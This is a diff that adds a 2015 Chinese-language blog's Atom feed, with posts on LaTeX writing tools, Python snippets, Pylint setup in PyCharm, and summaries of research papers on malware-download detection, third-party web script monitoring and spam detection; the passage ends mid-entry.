@@ -1,0 +1,1661 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Ourren]]></title>
+  <link href="http://blog.ourren.com/blog/atom.xml" rel="self"/>
+  <link href="http://blog.ourren.com/blog/"/>
+  <updated>2015-09-20T23:39:15-07:00</updated>
+  <id>http://blog.ourren.com/blog/</id>
+  <author>
+    <name><![CDATA[ourren]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[论文写作环境]]></title>
+    <link href="http://blog.ourren.com/blog/2015/09/19/xie-zuo-huan-jing/"/>
+    <updated>2015-09-19T11:13:32-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/09/19/xie-zuo-huan-jing</id>
+    <content type="html"><![CDATA[<p>古时候有“孟母三迁”的故事告诉我们：环境影响人的成长；而当代社会由于科技的快速发展，办公环境和工具的选择会直接影响人们的办公效率和工作的热情。高富帅公司往往以优秀的工作环境「高薪，Mac全套，人工学电脑椅，空气净化器等」来吸引应聘者，屌丝公司则是以人文情怀拉拢一堆基友。论文写作环境也不例外，极客者善于利用各种工具打造一套完整的写作、投稿与修正的工具链。个人虽然接触写作时间不长，但自认为高级的论文写作环境需要满足如下几项：</p>
+
+<ul>
+<li>作者不用担心格式问题「字体大小，间距，编号」；</li>
+<li>格式转换起来比较方便「方便投递不同期刊」；</li>
+<li>方便作者之间进行修改「对比修改前后差异」；</li>
+<li>语法句式检测「国人很常见的问题了」；</li>
+</ul>
+
+
+<p>鉴于如上的写作环境需求，个人在实践中总结了一套完整的写作工具链，现分享如下:</p>
+
+<!--more-->
+
+
+<h4>书写工具</h4>
+
+<p>初学者最常用的就是Word了，虽然各大会议或者期刊都提供了论文的Word模板，但是实际书写和排版过程中经常会遇到各种问题，解决起来非常麻烦。鉴于以上的各种经验，本人最终转向了LaTex。<a href="https://www.latex-project.org/">LaTeX</a>跟<a href="http://daringfireball.net/projects/markdown/">Markdown</a>的理念差不多，首先定义了一套书写规则，然后你按照其规则进行书写，最后你就可以生成一份完美的文档「譬如本文就是采用markdown进行书写的」，只不过LaTeX会相对复杂很多，主要针对学术作。支持LaTex的编辑器也很多，列举如下：</p>
+
+<ul>
+<li><a href="http://www.winedt.com/">WinEdt</a>:Windows下的写作利器，可惜是收费的。</li>
+<li><a href="https://www.overleaf.com/">overleaf</a>: 在线LaTex写作平台，免费版有些限制，但是基本上够用了；</li>
+<li><a href="http://www.texstudio.org/">TeXstudio</a>编辑器属于开源之作，免费并且跨平台，并且支持双栏同时显示「源文件,PDF预览」，可以说这个绝对是大屏显示器的福音。</li>
+</ul>
+
+
+<p><img src="http://ourren.b0.upaiyun.com/texstudio.png" alt="TeXstudio" /></p>
+
+<h4>拼写与语法检测</h4>
+
+<p>论文写作与投稿中遇到最多的问题就是语言问题，已有的语法检测工具如下：</p>
+
+<ul>
+<li>Word审阅中提供拼写和语法检测；</li>
+<li><a href="http://www.hemingwayapp.com/desktop.html">Hemingway Editor 2</a>提供语法和句型优化功能；</li>
+<li><a href="https://languagetool.org/">LanguageTool</a>: 开源的文体和语法校正的软件, 支持多种语言，并且可以集成到其他软件, 比如LanguageTool集成到TeXStudio<a href="http://wiki.languagetool.org/checking-la-tex-with-languagetool">Checking (La)TeX With LanguageTool</a>；</li>
+<li>一些其它的小工具，比如<a href="https://github.com/invernizzi/Chrisper">Chrisper</a>;</li>
+</ul>
+
+
+<p><img src="http://ourren.b0.upaiyun.com/grammar.png" alt="TeXstudio" /></p>
+
+<h4>版本管理</h4>
+
+<p>一篇论文从初稿到发表的过程中会生成不同的论文版本，而<a href="https://git-scm.com/">Git</a>的分布式管理可以让我们轻松管理不同版本的论文，而<a href="https://gitlab.com/">gitlab</a>, <a href="https://git.oschina.net/">oschina</a>, <a href="http://coding.net/">coding</a>等则提供了私有项目的功能，可以方便帮助我们管理论文版本。</p>
+
+<h4>修改与批注</h4>
+
+<p><img src="http://ourren.b0.upaiyun.com/latexdiff.png" alt="TeXstudio" /></p>
+
+<p>首先不得不说Word中的批注和删改功能做得非常不错，而<a href="https://www.ctan.org/tex-archive/support/latexdiff">latexdiff</a>插件的出现让LaTex也具有批注和删除功能，并且使用简单「参考说明文档即可」，效果显示也不错。</p>
+
+<h4>写作攻击链</h4>
+
+<p>通过如上的各种工具写作，最终选择的写作工具如下：</p>
+
+<ul>
+<li>写作: TeXstudio；</li>
+<li>拼写与语法检测: LanguageTool；</li>
+<li>版本控制: Gitlab；</li>
+<li>修改批注: latexdiff.</li>
+</ul>
+
+
+<h4>其它资料</h4>
+
+<ul>
+<li><a href="http://blog.ourren.com/2015/04/17/latex-skils-summary/">LaTeX写作技巧总结</a>;</li>
+<li><a href="https://github.com/secdr/research-method">论文写作与资料分享</a>;</li>
+<li><a href="http://www.latextemplates.com/">LaTeX Templates</a>;</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Python中的常用代码]]></title>
+    <link href="http://blog.ourren.com/blog/2015/07/19/pythonzhong-de-chang-yong-dai-ma/"/>
+    <updated>2015-07-19T17:17:33-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/07/19/pythonzhong-de-chang-yong-dai-ma</id>
+    <content type="html"><![CDATA[<p>日常Python代码中会经常遇到一些可以用很简短的代码即可实现的功能，不用自己去撸一个单独的函数或者多个循环语句了。其实一般主要靠Google搜索关键字即可在<a href="http://stackoverflow.com/">stackoverflow</a>找到，只能说像我等伪程序员离开网络写代码质量会直线下降。贴到这里也是方便自己使用，代码比较基础，仅作笔记使用。</p>
+
+<h4>合并列表值</h4>
+
+<p>输入的两个数组，输出一个是数组&amp;值相加或者相乘，原文：<a href="http://stackoverflow.com/questions/14050824/add-sum-of-values-of-two-lists-into-new-list">eg-1</a>：</p>
+
+<pre><code># input
+first = [1,2,3,4,5]
+second = [6,7,8,9,10]
+
+#output
+three = [7,9,11,13,15]
+
+# The zip function is useful here, used with a list comprehension.
+# add
+[x + y for x, y in zip(first, second)]
+
+# other
+[x*y for x, y in zip(first, second)]
+[max(x,y) for x, y in zip(first, second)]
+</code></pre>
+
+<p>其实也可以遍历列表长度，然后操作。</p>
+
+<!--more-->
+
+
+<p>另外如果对一个列表进行去重，直接采用set进行操作即可：</p>
+
+<pre><code>in_list = ['1', '2', '1', '3']
+in_list = list(set(in_list))
+</code></pre>
+
+<h4>合并字典值</h4>
+
+<p>合并两个字典，并将相同键的值进行操作，可以利用collections中的Counter进行操作，原文：<a href="http://stackoverflow.com/questions/11011756/is-there-any-pythonic-way-to-combine-two-dicts-adding-values-for-keys-that-appe">eg-2</a>：</p>
+
+<pre><code>&gt;&gt;&gt; from collections import Counter
+&gt;&gt;&gt; A = Counter({'a':1, 'b':2, 'c':3})
+&gt;&gt;&gt; B = Counter({'b':3, 'c':4, 'd':5})
+&gt;&gt;&gt; A + B
+Counter({'c': 7, 'b': 5, 'd': 5, 'a': 1})
+</code></pre>
+
+<p>更多Counter的操作可以参考官网指南，<a href="https://docs.python.org/2/library/collections.html#collections.Counter">collections</a>.</p>
+
+<h4>json与字典转换</h4>
+
+<p>不管是存储到数据库还是网络接口输出，都可以采用json格式，格式非常容易操作，而dict类型在Python中也很好操作，而且还可以嵌套。</p>
+
+<pre><code>import json
+data = {'a':"A",'b':(2,4),'c':3.0}  # dict
+
+data_string = json.dumps(data) # string &amp; json
+print "ENCODED:",data_string
+
+decoded = json.loads(data_string) ## dict
+print "DECODED:",decoded
+</code></pre>
+
+<h4>多列数据表与字段</h4>
+
+<p>有时候插入或者更新数据的时候数据表会有很多字段，这时也可以采用dict进行操作：</p>
+
+<pre><code>people_dict = {'name':'name', 'password':'password', 'salt':'salt'} # long dict
+columns = ', '.join(people_dict.keys())
+placeholders = ', '.join('?' * len(people_dict))
+insert_sql = 'INSERT INTO user ({}) VALUES ({})'.format(columns, placeholders)
+cursor_obj.execute(insert_sql, people_dict.values())
+</code></pre>
+
+<p>另外数据库插入一般可以采用executemany进行操作：</p>
+
+<pre><code>in_list = [('a','1'),('b','2')]
+c.executemany(""" INSERT INTO result ('name','value') values(?,?)""", in_list)
+</code></pre>
+
+<h4>排序问题</h4>
+
+<p>字典根据键排序， 原文：<a href="http://stackoverflow.com/questions/9001509/how-can-i-sort-a-dictionary-by-key">eg-3</a>：</p>
+
+<pre><code>&gt;&gt;&gt; import collections
+&gt;&gt;&gt; d = {2:3, 1:89, 4:5, 3:0}
+&gt;&gt;&gt; od = collections.OrderedDict(sorted(d.items()))
+&gt;&gt;&gt; od
+&gt;&gt;&gt; OrderedDict([(1, 89), (2, 3), (3, 0), (4, 5)])
+</code></pre>
+
+<p>字典根据值排序， 原文：<a href="http://stackoverflow.com/questions/613183/sort-a-python-dictionary-by-value">eg-4</a>：</p>
+
+<pre><code>&gt;&gt;&gt; import operator
+&gt;&gt;&gt; x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0}
+&gt;&gt;&gt; sorted_x = sorted(x.items(), key=operator.itemgetter(1))
+&gt;&gt;&gt; sorted_x
+[(0, 0), (2, 1), (1, 2), (4, 3), (3, 4)]
+</code></pre>
+
+<h4>日期操作</h4>
+
+<p>格式化日期与unixtimestamp的相互转换，原文：<a href="http://www.saltycrane.com/blog/2008/11/python-datetime-time-conversions/">eg-5</a>：</p>
+
+<pre><code>&gt;&gt;&gt; import datetime
+&gt;&gt;&gt; import time
+&gt;&gt;&gt; dt = datetime.datetime(2010, 2, 25, 23, 23)
+&gt;&gt;&gt; time.mktime(dt.timetuple())
+&gt;&gt;&gt; 
+
+from datetime import datetime
+import time
+
+#-------------------------------------------------
+# conversions to strings
+#-------------------------------------------------
+# datetime object to string
+dt_obj = datetime(2008, 11, 10, 17, 53, 59)
+date_str = dt_obj.strftime("%Y-%m-%d %H:%M:%S")
+print date_str
+
+# time tuple to string
+time_tuple = (2008, 11, 12, 13, 51, 18, 2, 317, 0)
+date_str = time.strftime("%Y-%m-%d %H:%M:%S", time_tuple)
+print date_str
+
+#-------------------------------------------------
+# conversions to datetime objects
+#-------------------------------------------------
+# time tuple to datetime object
+time_tuple = (2008, 11, 12, 13, 51, 18, 2, 317, 0)
+dt_obj = datetime(*time_tuple[0:6])
+print repr(dt_obj)
+
+# date string to datetime object
+date_str = "2008-11-10 17:53:59"
+dt_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
+print repr(dt_obj)
+
+# timestamp to datetime object in local time
+timestamp = 1226527167.595983
+dt_obj = datetime.fromtimestamp(timestamp)
+print repr(dt_obj)
+
+# timestamp to datetime object in UTC
+timestamp = 1226527167.595983
+dt_obj = datetime.utcfromtimestamp(timestamp)
+print repr(dt_obj)
+
+#-------------------------------------------------
+# conversions to time tuples
+#-------------------------------------------------
+# datetime object to time tuple
+dt_obj = datetime(2008, 11, 10, 17, 53, 59)
+time_tuple = dt_obj.timetuple()
+print repr(time_tuple)
+
+# string to time tuple
+date_str = "2008-11-10 17:53:59"
+time_tuple = time.strptime(date_str, "%Y-%m-%d %H:%M:%S")
+print repr(time_tuple)
+
+# timestamp to time tuple in UTC
+timestamp = 1226527167.595983
+time_tuple = time.gmtime(timestamp)
+print repr(time_tuple)
+
+# timestamp to time tuple in local time
+timestamp = 1226527167.595983
+time_tuple = time.localtime(timestamp)
+print repr(time_tuple)
+
+#-------------------------------------------------
+# conversions to timestamps
+#-------------------------------------------------
+# time tuple in local time to timestamp
+time_tuple = (2008, 11, 12, 13, 59, 27, 2, 317, 0)
+timestamp = time.mktime(time_tuple)
+print repr(timestamp)
+
+# time tuple in utc time to timestamp
+time_tuple_utc = (2008, 11, 12, 13, 59, 27, 2, 317, 0)
+timestamp_utc = calendar.timegm(time_tuple_utc)
+print repr(timestamp_utc)
+
+#-------------------------------------------------
+# results
+#-------------------------------------------------
+# 2008-11-10 17:53:59
+# 2008-11-12 13:51:18
+# datetime.datetime(2008, 11, 12, 13, 51, 18)
+# datetime.datetime(2008, 11, 10, 17, 53, 59)
+# datetime.datetime(2008, 11, 12, 13, 59, 27, 595983)
+# datetime.datetime(2008, 11, 12, 21, 59, 27, 595983)
+# (2008, 11, 10, 17, 53, 59, 0, 315, -1)
+# (2008, 11, 10, 17, 53, 59, 0, 315, -1)
+# (2008, 11, 12, 21, 59, 27, 2, 317, 0)
+# (2008, 11, 12, 13, 59, 27, 2, 317, 0)
+# 1226527167.0
+# 1226498367
+</code></pre>
+
+<h4>一些输出格式</h4>
+
+<p>输出的时候如果采用“\t&#8221;进行格式化，也会出现一些对齐问题，可以采用&#8221;\t”和“%-20s&#8221;格式化代码：</p>
+
+<pre><code># 20 could be change to another value 
+print "\t%-20s%-20s%-20s%-20s%-20s%-20s"% tuple(in_list)
+</code></pre>
+
+<h4>todo</h4>
+
+<pre><code>未完待续
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Python代码规范入门]]></title>
+    <link href="http://blog.ourren.com/blog/2015/07/08/pythondai-ma-gui-fan-ru-men/"/>
+    <updated>2015-07-08T12:55:49-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/07/08/pythondai-ma-gui-fan-ru-men</id>
+    <content type="html"><![CDATA[<p>虽然接触Python已经有好几年了，同时前前后后也开发过很多小工具或者系统，但是一直觉得代码不是很规范，最近抽空了解了这方面的资料，现归纳如下，也方便pythoner学习，文章首先介绍Python代码规范的程序，然后分享在Pycharm中嵌入Pylint程序来实现快速检测代码质量。</p>
+
+<p>Google开放的各类语言代码规范中就有就有「Python风格规范」, 里面对语言规范和风格规范进行了详细的描述，不失为提升自己代码规范的入门资料。但是让我阅读「编写高质量代码 改善Python程序的91个建议」此书时才发现原来Google这种代码规范属于「PEP8」规范。同样，PEP8也不是唯一的风格检测程序，类似的应用还有Pychecker、Pylint、Pyflakes等。其中，Pychecker是Google Python Style Guide推荐的工具；Pylint因可以非常方便地通过编辑配置文件实现公司或团队的风格检测而受到许多人的青睐；Pyflakes则因为易于集成到vim中，所以使用的人也非常多。这样看我们只需要选择一个适合自己的代码规范即可，而如上所述，Pylint高可配置性，高可定制性，并且可以很容易写小插件来添加功能。因此，我最终选择了Pylint来实现代码规范检测。</p>
+
+<!--more-->
+
+
+<h4>Pycahrm集成Pylint</h4>
+
+<p>Pycharm是我目前最喜欢的Python IDE「请不要把Sublime拿来对比，当你写大项目的时候你就知道区别了」。当我搜索如何把Pylint集成到Pycharm的时候发现其实资料很少「参考4,5」，按着步骤做还有些问题，遂修正如下：</p>
+
+<p>安装pylint</p>
+
+<pre><code>sudo pip install pylint
+</code></pre>
+
+<p>依次打开如下菜单：</p>
+
+<pre><code>Open “Settings &gt; Tools &gt; External Tools” and press the “+” button.
+</code></pre>
+
+<p><img src="http://blog.ourren.com/upload/pycharm_0.jpg" alt="step1" /></p>
+
+<p>设置相关参数，参数和工作目录请使用宏，点击即可选择:</p>
+
+<p><img src="http://blog.ourren.com/upload/pycharm_1.png" alt="step1" /></p>
+
+<p>添加此插件到工具栏：在工具栏点右键&mdash;“Customize Menus and Toolbars”&mdash;“Main Toolbar”&mdash;“Help Topics”&mdash;-&ldquo;Add after&rdquo;&mdash;&ldquo;External Tools&rdquo;&mdash;&ldquo;Pylint&rdquo;, 然后就搞定了。</p>
+
+<h4>测试实践</h4>
+
+<p>代码写好了之后按一下这个按钮即可对改代码进行规范性检测，同时测试报告会给出你不符合规格的行数和问题，测试效果可以参照「6」进行测试，例如测试下面的代码：</p>
+
+<pre><code> Customize Menus and Toolbars#coding:utf-8
+'''
+    a test function module
+'''
+import urllib
+import time
+
+def fetch(url):
+    '''
+        fetch url
+    '''
+    content = urllib.urlopen(url).read()
+    f_html = open('tmp%s.html' % str(time.time()), 'w')
+    f_html.write(content)
+    f_html.close()
+
+def main(urls):
+    '''
+        main func to be called
+    '''
+    for url in urls:
+        fetch(url)
+
+if __name__ == '__main__':
+    FROM_URLS = ['http://www.baidu.com','http://www.sohu.com']
+    main(FROM_URLS)
+</code></pre>
+
+<p>测试报告如下，可以发现此代码最终得到了「10.00/10」，说明代码规范非常不错。</p>
+
+<pre><code>/usr/local/bin/pylint pyl.py
+No config file found, using default configuration
+
+
+Report
+======
+14 statements analysed.
+
+Statistics by type
+------------------
+
++---------+-------+-----------+-----------+------------+---------+
+|type     |number |old number |difference |%documented |%badname |
++=========+=======+===========+===========+============+=========+
+|module   |1      |1          |=          |100.00      |0.00     |
++---------+-------+-----------+-----------+------------+---------+
+|class    |0      |0          |=          |0           |0        |
++---------+-------+-----------+-----------+------------+---------+
+|method   |0      |0          |=          |0           |0        |
++---------+-------+-----------+-----------+------------+---------+
+|function |2      |2          |=          |100.00      |0.00     |
++---------+-------+-----------+-----------+------------+---------+
+
+
+
+Raw metrics
+-----------
+
++----------+-------+------+---------+-----------+
+|type      |number |%     |previous |difference |
++==========+=======+======+=========+===========+
+|code      |13     |41.94 |14       |-1.00      |
++----------+-------+------+---------+-----------+
+|docstring |10     |32.26 |10       |=          |
++----------+-------+------+---------+-----------+
+|comment   |2      |6.45  |2        |=          |
++----------+-------+------+---------+-----------+
+|empty     |6      |19.35 |5        |+1.00      |
++----------+-------+------+---------+-----------+
+
+
+
+Duplication
+-----------
+
++-------------------------+------+---------+-----------+
+|                         |now   |previous |difference |
++=========================+======+=========+===========+
+|nb duplicated lines      |0     |0        |=          |
++-------------------------+------+---------+-----------+
+|percent duplicated lines |0.000 |0.000    |=          |
++-------------------------+------+---------+-----------+
+
+
+
+Messages by category
+--------------------
+
++-----------+-------+---------+-----------+
+|type       |number |previous |difference |
++===========+=======+=========+===========+
+|convention |0      |1        |-1.00      |
++-----------+-------+---------+-----------+
+|refactor   |0      |0        |=          |
++-----------+-------+---------+-----------+
+|warning    |0      |0        |=          |
++-----------+-------+---------+-----------+
+|error      |0      |0        |=          |
++-----------+-------+---------+-----------+
+
+
+
+Global evaluation
+-----------------
+Your code has been rated at 10.00/10 (previous run: 9.29/10, +0.71)
+
+
+Process finished with exit code 0
+</code></pre>
+
+<h4>参考资料</h4>
+
+<ol>
+<li><a href="http://zh-google-styleguide.readthedocs.org/en/latest/google-python-styleguide/">Google Python 风格指南 - 中文版</a></li>
+<li><a href="https://book.douban.com/subject/25910544/">编写高质量代码 改善Python程序的91个建议</a></li>
+<li><a href="https://www.jetbrains.com/pycharm/">Pycharm download</a></li>
+<li><a href="http://blog.saturnlaboratories.co.za/archive/2012/09/10/running-pylint-pycharm">Running PyLint in PyCharm</a></li>
+<li><a href="http://softwaretester.info/integrate-pylint-in-pycharm/">Integrate pylint in PyCharm</a></li>
+<li><a href="http://www.the5fire.com/python-clean-code-pylint.html">python代码检查工具pylint-让你的python更规范</a></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Measuring and Detecting Malware Downloads in Live Network Traffic]]></title>
+    <link href="http://blog.ourren.com/blog/2015/07/03/measuring-and-detecting-malware-downloads-in-live-network-traffic/"/>
+    <updated>2015-07-03T00:32:58-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/07/03/measuring-and-detecting-malware-downloads-in-live-network-traffic</id>
+    <content type="html"><![CDATA[<p>今天分享的是Roberto Perdisci教授在2013年发表在ESORICS上的一篇论文，该文在Google学术中虽然引用不高，单独读完之后感觉在分类前提取特征的方法写得不错，分享给大家。</p>
+
+<h3>概述</h3>
+
+<p>论文主要观点：</p>
+
+<p>通过在网络出口部署相关设备，可以观察局域网内所有软件下载行为，通过一系列的行为特征和恶意软件的标签即可实现恶意软件的分类，并且可以发现未知恶意软件，同时该分类效果比谷歌浏览器的恶意检测系统在一定程度上误报率要低。</p>
+
+<p>论文主要成果：</p>
+
+<ul>
+<li>提出了一种在网络数据包中检测恶意软件下载行为的模型；</li>
+<li>通过实际部署发现效果还不错，可以发现一些未知的恶意样本；</li>
+<li>通过对比发现，模型的误报率其实挺低，准确率也挺高的。</li>
+</ul>
+
+
+<!--more-->
+
+
+<h3>模型框图</h3>
+
+<p><img src="http://blog.ourren.com/upload/amico.png" alt="amico" /></p>
+
+<h3>创新技术点</h3>
+
+<p>个人感觉论文主要的亮点在于对这种检测模型中的特征的挖掘和阐述，其次文章对模型和整个研究内容的细节和死角都做了很详细的分析和阐述，让你找不出破绽。另外作者的测试方法也还是蛮有意思的。</p>
+
+<p>这里重点阐述作者模型中的特征选取问题：</p>
+
+<h4>历史下载数据。</h4>
+
+<p>通过分析连续一段时间文件的下载次数，多少客户下载，第一次下载是多少天以前，一天有多少下载量等，这个作为一个大类的特征，然后分为很多小特征。</p>
+
+<p>「选择依据」一个正常软件的sha1值一般是固定的，因为一般软件升级需要一段时间，而恶意软件则需要经常免杀，所以sha1值经常变动，导致每个sha1值的下载量很少，并且恶意软件下载的量一般也会很少。</p>
+
+<h4>域名特征</h4>
+
+<p>主要涉及域名的二级域名，或者域名后缀，同时结合历史数据来计算每一类域名的恶意概率，正常文件对应的数量，每个顶级域名下载量等。</p>
+
+<p>「选择依据」恶意软件虽然经常变换域名，但是很多时候可能只是更换二级域名或者是直接更换定于域名，但是一般情况下后缀不会改变，另外恶意域名对应的下载量应该很小，应该会经常变换域名和文件。</p>
+
+<h4>服务端IP特征</h4>
+
+<p>涉及服务端IP所属BGP，服务器地区，然后跟这几个属性关联的数量，比如某个BGP下下载量是多少，有多少正常文件等等。</p>
+
+<p>「选择依据」恶意文件托管或者存放一般可能会改动IP地址，但是改动不大，可能还是一些BGP下，那么统计其分布情况和数量就非常重要。</p>
+
+<h4>URL特征</h4>
+
+<p>主要考虑URL的构成（路径，特殊符号，参数，文件名等）跟恶意数量和正常样本的数量分布情况，</p>
+
+<p>「选择依据」考虑一个团伙或者一套恶意系统往往存在一些相似的地方，其URL相似度可能比较高。</p>
+
+<h4>下载请求特征</h4>
+
+<p>恶意软件下载的时候请求头，是否带有referer url，路径的深度等于历史。</p>
+
+<p>「选择依据」很多恶意请求基本上referer都是为空，另外恶意文件下载的链接跟正常的一般也不一样，没有jpg,gif这些后缀。</p>
+
+<h3>缺点</h3>
+
+<ul>
+<li>虽然作者考虑了很多因素来综合评定文件是否恶意，但是HTTPS没办法测试，除了SSLtrip。</li>
+<li>针对分段的恶意木马没办法检测；</li>
+<li>恶意攻击者可以针对性改进。</li>
+</ul>
+
+
+<p>后话，作者主页上的<a href="http://roberto.perdisci.com/useful-links">Useful Public Resources</a>对恶意库和检测平台总结还是比较全，推荐。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Understanding and Monitoring Embedded Web Scripts]]></title>
+    <link href="http://blog.ourren.com/blog/2015/06/18/understanding-and-monitoring-embedded-web-scripts/"/>
+    <updated>2015-06-18T10:26:49-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/06/18/understanding-and-monitoring-embedded-web-scripts</id>
+    <content type="html"><![CDATA[<p>该篇文章发表于36th IEEE Symposium on Security and Privacy (&ldquo;Oakland&rdquo;)「属于安全界的顶级会议」，而作者是Yuchen Zhou，毕业于University of Virginia，目前就职Palo Alto Networks。从作者的<a href="http://www.yuchenzhou.info/research">个人主页</a>可以看到其主要的研究内容：通过修改浏览器中特殊功能来实现对单点Web安全技术进行研究。PS：发的顶会文章也是够多的。</p>
+
+<p>该<a href="http://scriptinspector.org/">项目</a>主要开发了一个修改版的Firefox浏览器「ScriptInspector」来帮助网站管理人员查看网站第三方JavaScript对网页内容的相关操作，主要分为三个模块：ScriptInspector，Visualizer和PolicyGenerator。</p>
+
+<ul>
+<li>ScriptInspector：基于Firefox的修改版浏览器，主要修改window.eval等函数的hook. 用来记录第三方脚本的函数调用，主要包含：DOM, 本地存储和网络。</li>
+<li>Visualizer：一个Firefox插件，用来高亮显示页面中被访问的节点，可以快速了解第三方脚本的操作。</li>
+<li>PolicyGenerator：用于辅助人员生成各种第三方脚本的访问策略，通过这些脚本在不同网站的访问情况可以推断该脚本的安全性。</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>作者通过分析把第三方脚本的操作分为了如下大类：获取浏览器版本，网络请求，修改网页内容，读取网页内容，记录用户操作，脚本插入，获取属性值。在具体实现部分从技术上讲解了这几类操作的实现细节。</p>
+
+<p>在策略分类问题上，主要分为几下几类：统计分析类脚本，广告类脚本，社交类脚本和Web开发类脚本「比如Jquery,google font等」。</p>
+
+<p>在最终测试中发现了很多有意思的东西：Alex 200的网站嵌入第三方脚本很多，并且有些脚本有违规的操作，比如每个网站平均需要6个权限，Facebook和Twitter请求权限很多，并且有时候会读取其它网页内容或者操作行为等，详细可以参考论文的「POLICY EVALUATION」。</p>
+
+<p>相关研究中对客户端脚本安全进行了详细的梳理，可以说非常不错。</p>
+
+<h3>点评</h3>
+
+<p>其实研究第三方脚本的安全隐私的论文已经很多了「可以参考文章中得相关工作和参考文献」，但是一般情况都是直接写一个插件利用JS HOOK来记录脚本的活动「Ghostery，BEEP，MashupOS，OMash」，而基于修改版的Firefox则很少，工业界中<a href="https://dominator.mindedsecurity.com/">DOMinator</a>利用修改版的Firefox来挖掘DOM XSS，而学术界貌似很少。 其实CSP的提出也是用于解决此类安全问题。</p>
+
+<p>另外论文的工作量看起来是比较多的，但是说实话测试数据不是很大，下载使用其程序感觉不够稳定，基本上算demo版本。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Detecting Spammers on Twitter]]></title>
+    <link href="http://blog.ourren.com/blog/2015/05/21/detecting-spammers-on-twitter/"/>
+    <updated>2015-05-21T19:43:11-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/05/21/detecting-spammers-on-twitter</id>
+    <content type="html"><![CDATA[<p>文章主要是通过机器学习的思路来自对twitter的用户进行分类「两类：正常用户与垃圾用户」。其中算法采用的是SVM算法，特征选取比较复杂，结合了内容特征与用户行为特征。个人感觉不错的是论文针对特征的选取和特征的精简部分。</p>
+
+<h3>整体流程</h3>
+
+<ol>
+<li>首先爬取了大量Twitter用户的数据（通过API接口 + 大量VPS/IP）；</li>
+<li>通过特定主题进行跟踪，例如跟踪：「the Michael Jackson’s death」，「Susan Boyle’s emergence,」，「the hashtag “#musicmon- day”」；即把这几个主题的发言和评论抓出来进行分析；这里实验数据处理的时候有一个技巧：正常内容很多，而垃圾内容太少，为了不让比例失调，特别减少了正常用户的比例，基本上「正常用户:垃圾用户(1：2)」;</li>
+<li>手动做标签，作者写分为三个人同时对同一样本做标签，然后标识的时候需要参照三个人的答案；</li>
+<li>提取特征值，鉴于特征值比较多，因此需要针对特征值进行分析，分析单一特征是否可以区分两类用户；</li>
+<li>通过SVM算法对已经标识的样本进行建模，然后测试样本；</li>
+<li>通过分析特征值，降维处理「减少特征值」；</li>
+<li>最后计算准确率并分析。</li>
+</ol>
+
+
+<!--more-->
+
+
+<h3>创新点</h3>
+
+<ol>
+<li>从内容特征和用户特征对twitter社交数据进行特征提取，内容特征考虑：最大长度，最小长度，均值，一个内容中的主题(##), 网址数量，单词数量，数字出现个数，@的用户数量，有多少人转发等「39个属性」；用户特征：粉丝数量，关注数量，发帖数量，转帖数量，年龄，被@多少次，多少次回复，发帖时间间隔，一天发多少帖，一周发多少帖「23个属性」。</li>
+<li>单一特征对分类的影响采用了cumulative distribution function (CDF)进行了分析，不熟悉CDF的可以看这里<a href="http://www.lifelaf.com/blog/?p=746">一维数据可视化：累积分布函数(Cumulative Distribution Function)</a>;</li>
+<li>SVM分类中采用了5阶交叉验证，即SVM参数的不同；</li>
+<li>通过信息增益或者X2统计分析TOP10,TOP20,-TOP50特征值「内容特征与用户特征」的数量；关于信息增益可以看这里：<a href="http://www.blogjava.net/zhenandaci/archive/2009/03/24/261701.html">文本分类入门（十一）特征选择方法之信息增益</a>;</li>
+<li>然后用这些特征再次测试准确率。</li>
+</ol>
+
+
+<h3>总结</h3>
+
+<p>从工作量上看确实需要做大量的工作，另外作者对特征选取，特征优化这些做得很不错。最后请记住这个是2010年的论文。</p>
+
+<p>论文下载<a href="http://www.decom.ufop.br/fabricio/download/ceas10.pdf">Detecting Spammers on Twitter</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[On the Relations Between the Different Actors in the Spam Landscape]]></title>
+    <link href="http://blog.ourren.com/blog/2015/05/11/on-the-relations-between-the-different-actors-in-the-spam-landscape/"/>
+    <updated>2015-05-11T17:42:36-07:00</updated>
+    <id>http://blog.ourren.com/blog/2015/05/11/on-the-relations-between-the-different-actors-in-the-spam-landscape</id>
+    <content type="html"><![CDATA[<p>该篇论文的题目为：<a href="http://dl.acm.org/citation.cfm?id=2590302">The Harvester, the Botmaster, and the Spammer- On the Relations Between the Different Actors in the Spam Landscape</a> 通过分析Harvester，Botmaster和Spammer之间的关系。</p>
+
+<p>其实整个过程可以描述为：攻击者从网络上收集邮箱地址，然后利用Botnet发送推广广告或者恶意内容，从而获利。因此论文中对整个过程进行了重现：</p>
+
+<ul>
+<li>自己搭建了网络服务并把邮件地址公布在网络上「采用的是自己搭建的邮件服务器」，等待攻击者来采集邮箱，同时记录下其爬虫的标示「HTTP头，IP地址和其它信息」；</li>
+<li>记录邮件服务器软件的收信过程，详细记录投递过程，攻击者在发送邮件的时候会暴露一些特征「使用邮件服务器，握手过程」；</li>
+<li>对攻击者发送的内容进行分析「主题，域名，发送软件，发件人」；</li>
+<li>通过以上数据对这个攻击链进行分析。</li>
+</ul>
+
+
+<!--more-->
+
+
+<h3>贡献</h3>
+
+<p>通过阅读论文，发现文章主要有如下的贡献点：</p>
+
+<ul>
+<li>通过搭建蜜罐系统来分析这个攻击链，可以说工作量相对比较多，思路也不错；</li>
